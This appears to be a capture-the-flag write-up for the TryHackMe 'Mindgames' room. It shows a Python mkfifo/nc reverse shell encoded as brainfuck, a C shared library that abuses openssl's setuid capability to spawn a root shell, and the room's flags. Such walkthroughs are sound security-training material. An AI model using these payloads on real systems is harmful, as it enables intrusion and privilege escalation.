> Mindgames | 

## export IP=10.10.212.19

# Nmap 

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

# Gobuster

```
index.html
```

In port 80, decoding the brainfuck language we get to see python code.

Creating our reverse shell in python and encoding in brainfuck

# Python reverse shell

```
import os

os.system('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.107.21 1234 > /tmp/f')
```

# Brainfuck

```
+++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++
[->-- ----- --<]> ---.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++++ ++.++
++.<+ +++++ ++++[ ->--- ----- --<]> --.-- -.+++ .---. <++++ +++++ +[->+
+++++ ++++< ]>+.+ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++ ++[->
+++++ +++<] >++++ +.+++ +++.- ----- .+.<+ ++[-> ---<] >---- --.++ +++++
+.<++ +++++ +[->- ----- --<]> ----- .-.<+ +++++ ++[-> +++++ +++<] >++++
+++++ ++.-- ---.< +++++ +++[- >---- ----< ]>--- ----- ----- .<+++ [->++
+<]>+ +++++ .<+++ +++++ [->++ +++++ +<]>+ ++++. ----- --.++ +.<++ +++++
+[->- ----- --<]> -.<++ +++++ [->++ +++++ <]>++ ++++. <++++ ++[-> -----
-<]>- ----- -.<++ +++[- >---- -<]>- -.<++ +++++ +[->+ +++++ ++<]> +++++
+++++ +++.- -.--- --.++ +.--- .++++ +++++ .<+++ +++++ [->-- ----- -<]>-
----- ----- ----. <+++[ ->+++ <]>++ ++++. <++++ ++++[ ->+++ +++++ <]>++
+++.- ----- -.+++ .<+++ +++++ [->-- ----- -<]>- .<+++ ++++[ ->+++ ++++<
]>+++ +++.< +++++ +[->- ----- <]>-- ----- .<+++ ++[-> ----- <]>-- .<+++
+++++ [->++ +++++ +<]>+ ++.-- .<+++ +[->+ +++<] >+++. <++++ +++++ [->--
----- --<]> ---.< +++[- >+++< ]>+++ +++.< +++++ +++[- >++++ ++++< ]>+++
++.-- ----- .+++. <++++ ++++[ ->--- ----- <]>-. <++++ +++[- >++++ +++<]
>++++ ++.<+ +++++ ++[-> ----- ---<] >---- --.<+ +++++ +++[- >++++ +++++
<]>++ +++++ ++++. <++++ +++++ [->-- ----- --<]> ----- ----- -.<++ +[->+
++<]> +++++ +.<++ +++++ [->++ +++++ <]>++ .++++ +++.+ ++++. <++++ +++[-
>---- ---<] >---- ----- ----- .<+++ +++++ [->++ +++++ +<]>+ +++.< +++[-
>---< ]>--. <++++ ++++[ ->--- ----- <]>-- ----- -.<++ +[->+ ++<]> ++++.
<++++ +++[- >++++ +++<] >++++ +++++ ++.<+ +++++ ++[-> ----- ---<] >----
----- .<+++ +[->+ +++<] >++.< +++[- >+++< ]>+++ .<+++ +[->- ---<] >----
----. <+++[ ->+++ <]>++ .<+++ +[->- ---<] >-.<+ +++++ +++[- >++++ +++++
<]>++ +++++ ++++. <++++ +++++ [->-- ----- --<]> ----- ----- -.<++ +++++
+[->+ +++++ ++<]> +++++ +++++ ++++. <+++[ ->--- <]>-- .<+++ +++++ [->--
----- -<]>- --.<+ +++[- >++++ <]>+. -.--. <+++[ ->+++ <]>+. <+++[ ->---
<]>-. +++.- .++++ +++.- ----- ---.+ +++.- .<+++ +[->- ---<] >-.<+ +++[-
>++++ <]>+. +.+.+ .<+++ +[->- ---<] >---- .<+++ ++[-> +++++ <]>++ +++.<
+++++ [->-- ---<] >---- -.<++ +[->+ ++<]> +++++ +.<++ +++++ +[->+ +++++
++<]> +++++ .---- ---.+ ++.<+ +++++ ++[-> ----- ---<] >-.<+ +++++ +[->+
+++++ +<]>+ +++++ .<+++ ++++[ ->--- ----< ]>--- ----- ----- -.++. <
```

And converting it to brainfuck and loading in the page we get a shell!!

user.txt
============================
thm{411f7d38247ff441ce4e134b459b6268}
============================

And running linpeas.sh we get something interesting!!

```
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
```

On looking at GTFO bins, we can see that we can upload a malicious library.

openssl.c

```
#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0);
    execl("/bin/sh", "sh", NULL);
}
```

## Compile into shared library

```
gcc -fPIC -o openssl.o -c openssl.c
gcc -shared -o openssl.so -lcrypto openssl.o
```

Spin up a python server and transfer the `openssl.so` to box.

Now running `openssl req -engine ./openssl.so` gives us root.

root.txt
=============================
thm{1974a617cc84c5b51411c283544ee254}
=============================